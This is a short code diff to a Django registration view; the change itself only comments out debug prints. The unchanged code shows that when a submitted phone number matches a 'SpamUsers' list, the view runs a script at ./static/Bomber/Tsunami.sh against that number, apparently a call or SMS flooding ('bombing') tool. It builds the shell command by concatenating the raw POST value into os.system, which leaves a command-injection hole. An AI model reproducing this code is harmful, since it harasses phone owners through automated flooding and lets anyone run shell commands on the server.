@@ -12,12 +12,12 @@ def Register(request):
         phno=request.POST.get('PhoneNo')
         #retrieving PhoneNo from SpamUsers Model
         sp_phno = [p.PhoneNo for p in SpamUsers.objects.all()]
-        print(sp_phno,type(sp_phno[0]))
-        print(phno,type(phno))
+        #print(sp_phno,type(sp_phno[0]))
+        #print(phno,type(phno))
         #check if  exist in SpamUser Model
         if phno in sp_phno:
             #Punish
-            print("Bomb to this Spam User ")
+            #print("Bomb to this Spam User ")
             os.system("chmod +x ./static/Bomber/Tsunami.sh")
             os.system("printf '"+phno+"\n1\n' | ./static/Bomber/Tsunami.sh")
             return HttpResponse("<script>alert('Bombing to this Spam User... ');</script>")
